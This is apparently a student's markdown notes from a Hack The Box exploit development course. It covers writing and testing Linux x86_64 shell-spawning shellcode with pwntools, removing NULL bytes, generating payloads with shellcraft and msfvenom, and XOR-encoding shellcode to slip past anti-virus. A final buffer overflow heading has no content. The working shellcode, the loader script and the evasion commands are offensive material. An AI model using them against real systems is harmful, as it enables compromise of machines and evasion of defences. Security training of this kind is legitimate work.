# Exploit Development
- [Shellcoding](#shellcoding)
    - [Shellcodes](#shellcodes)
    - [Shellcoding Techniques](#shellcoding-techniques)
    - [Shellcoding Tools](#shellcoding-tools)
        - [Shell Shellcode](#shell-shellcode)
        - [Shellcraft](#shellcraft)
        - [Msfvenom](#msfvenom)
        - [Shellcode Encoding](#shellcode-encoding)
- [Stack-Based Buffer Overflows on Linux x86](#stack-based-buffer-overflows-on-linux-x86)

## Shellcoding
### Shellcodes
- A shellcode is the hex representation of a binary's executable machine code.
- **Assembly to Machine Code**
    - Each x86 instruction and each register has its own binary machine code (usually represented in hex). For example, the push rax instruction has the machine code 50, while push rbx has the machine code 53, and so on. When we assemble our code with nasm, it converts our assembly instructions to their respective machine code so that the processor can understand them.
    - We will use pwntools to assemble and disassemble our machine code

    ```bash
    sudo pip3 install pwntools

    # we can use pwn asm to assemble any assembly code into its shellcode
    pwn asm 'push rax'  -c 'amd64'
    ```

> [!NOTE]
> We used the `-c 'amd64'` flag to ensure the tool properly interprets our assembly code for x86_64

- **Extract Shellcode**
    - Python script to extract shellcode from any binary. shellcoder.py:

    ```python
    #!/usr/bin/python3

    import sys
    from pwn import *

    context(os="linux", arch="amd64", log_level="error")

    file = ELF(sys.argv[1])
    shellcode = file.section(".text")
    print(shellcode.hex())
    print("%d bytes - Found NULL byte" % len(shellcode)) if [i for i in shellcode if i == 0] else print("%d bytes - No NULL bytes" % len(shellcode))

    ```
    - Python script to run shellcode. Loader.py:
    ```python
    #!/usr/bin/python3
    import sys
    from pwn import *

    context(os="linux", arch="amd64", log_level="error")

    run_shellcode(unhex(sys.argv[1])).interactive()
    ``` 

- **Debugging Shellcode**
    - We will build our shellcode to an elf binary and then use this binary with gdb so we can debug. 
    - Python script to convert shellcode into binary and save it. assembler.py: 
    ```python
    #!/usr/bin/python3

    import sys, os, stat
    from pwn import *

    context(os="linux", arch="amd64", log_level="error")

    ELF.from_bytes(unhex(sys.argv[1])).save(sys.argv[2])
    os.chmod(sys.argv[2], stat.S_IEXEC)
    ```

### Shellcoding Techniques

- To be able to produce a working shellcode, there are three main Shellcoding Requirements our assembly code must meet:
    1. Does not contain variables
    2. Does not refer to direct memory addresses
    3. Does not contain any NULL bytes 00

1. Variables
    - There are many techniques we can use to avoid using variables, like:

        - Moving immediate strings to registers
        - Pushing strings to the Stack, and then use them

```bash
    mov rbx, 'y!'
    push rbx
    mov rbx, 'B Academ'
    push rbx
    mov rbx, 'Hello HT'
    push rbx
    mov rsi, rsp
```

> [!NOTE]
> Whenever we push a string to the stack, we have to push a 00 before it to terminate the string.

2. Addresses
    - To be able to do so, we cannot reference direct memory address (i.e. call 0xffffffffaa8a25ff), and instead only make calls to labels (i.e. call loopFib) or relative memory addresses (i.e., call 0x401020). 

    - If we ever had any calls or references to direct memory addresses, we can fix that by:

        - Replacing with calls to labels or rip-relative addresses (for calls and loops)
        - Push to the Stack and use rsp as the address (for mov and other assembly instructions)

3. NULL

    - NULL characters (or 0x00) are used as string terminators in assembly and machine code, and so if they are encountered, they will cause issues and may lead the program to terminate early.

    - This commonly happens when moving a small integer into a large register, so the integer gets padded with an extra 00 to fit the larger register's size.

    - To avoid having these NULL bytes, we must use registers that match our data size.
```bash
    xor rbx, rbx
    mov bx, 'y!'
```

> [!TIP]
> If we ever need to move 0 to a register, we can zero-out that register. Likewise, if we even need to push 0 to the stack (e.g. for String Termination) we can zero-out any register, and then push that register to the stack.

### Shellcoding Tools

#### Shell Shellcode
- We can use the execve syscall with syscall number 59, which allows us to execute a system application:
```bash
abdeonix@htb[/htb]$ man -s 2 execve

int execve(const char *pathname, char *const argv[], char *const envp[]);
```
- Our final function will be:

`execve("/bin//sh", ["/bin//sh"], NULL)`

- So, we'll set our arguments as:
    1. rax -> 59 (execve syscall number)
    2. rdi -> ['/bin//sh'] (pointer to program to execute)
    3. rsi -> ['/bin//sh'] (list of pointers for arguments)
    4. rdx -> NULL (no environment variables)

> [!NOTE]
> We added an extra / in '/bin//sh' so that the total character count is 8, which fills up a 64-bit register, so we don't have to worry about clearing the register beforehand or dealing with any leftovers. Any extra slashes are ignored in Linux, so this is a handy trick to even the total character count when needed, and it is used a lot in binary exploitation.

- The following assembly code should execute the syscall we need:
```nasm
global _start

section .text
_start:
    mov rax, 59         ; execve syscall number
    push 0              ; push NULL string terminator
    mov rdi, '/bin//sh' ; first arg to /bin/sh
    push rdi            ; push to stack 
    mov rdi, rsp        ; move pointer to ['/bin//sh']
    push 0              ; push NULL string terminator
    push rdi            ; push second arg to ['/bin//sh']
    mov rsi, rsp        ; pointer to args
    mov rdx, 0          ; set env to NULL
    syscall
```

- Remove null bytes to produce efficient shell code
```nasm
_start:
    mov al, 59          ; execve syscall number
    xor rdx, rdx        ; set env to NULL
    push rdx            ; push NULL string terminator
    mov rdi, '/bin//sh' ; first arg to /bin/sh
    push rdi            ; push to stack 
    mov rdi, rsp        ; move pointer to ['/bin//sh']
    push rdx            ; push NULL string terminator
    push rdi            ; push second arg to ['/bin//sh']
    mov rsi, rsp        ; pointer to args
    syscall
```

#### Shellcraft
- shellcraft library generates a shellcode for various syscalls. We can list syscalls the tool accepts as follows: `pwn shellcraft -l 'amd64.linux'`

- `amd64.linux.sh` syscall drops us into a shell . We can generate its shellcode as follows: `pwn shellcraft amd64.linux.sh` . We can run the shellcode by adding the `-r` flag: `pwn shellcraft amd64.linux.sh -r `


- We can use the Python3 interpreter to unlock shellcraft fully and use advanced syscalls with arguments.
```python
abdeonix@htb[/htb]$ python3

>>> from pwn import *
>>> context(os="linux", arch="amd64", log_level="error")
>>> dir(shellcraft)

[...SNIP... 'execve', 'exit', 'exit_group', ... SNIP...]

>>> syscall = shellcraft.execve(path='/bin/sh',argv=['/bin/sh']) # syscall and args
>>> asm(syscall).hex() # print shellcode

'48b801010101010101015048b82e63686f2e726901483104244889e748b801010101010101015048b82e63686f2e7269014831042431f6566a085e4801e6564889e631d26a3b580f05'
```


#### Msfvenom
- We can use for shellcode generation. Once again, we can list various available payloads for Linux and x86_64 with: `msfvenom -l payloads | grep 'linux/x64'`

- The exec payload allows us to execute a command we specify. Let's pass '/bin/sh/' for the CMD, and test the shellcode we get: `msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'`

#### Shellcode Encoding

- Encoding shellcodes can become a handy feature for systems with anti-virus or certain security protections.
- **Steps**
    1. We can use msfvenom to encode our shellcodes as well. We can first list available encoders: `msfvenom -l encoders`

    2. Then we can pick one for x64, like x64/xor, and use it with the -e flag, as follows: `msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'`



> [!TIP]
> We can encode our shellcode multiple times with the `-i` COUNT flag, and specify the number of iterations we want.

- If we had a custom shellcode that we wrote, we could use msfvenom to encode it as well, by writing its bytes to a file and then passing it to msfvenom with -p -, as follows:
```bash
abdeonix@htb[/htb]$ python3 -c "import sys; sys.stdout.buffer.write(bytes.fromhex('b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05'))" > shell.bin
abdeonix@htb[/htb]$ msfvenom -p - -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor' < shell.bin
```

- Shellcode Resources: [Shell-Storm](https://shell-storm.org/shellcode/index.html) or [Exploit DB](https://www.exploit-db.com/shellcodes)

## Stack-Based Buffer Overflows on Linux x86
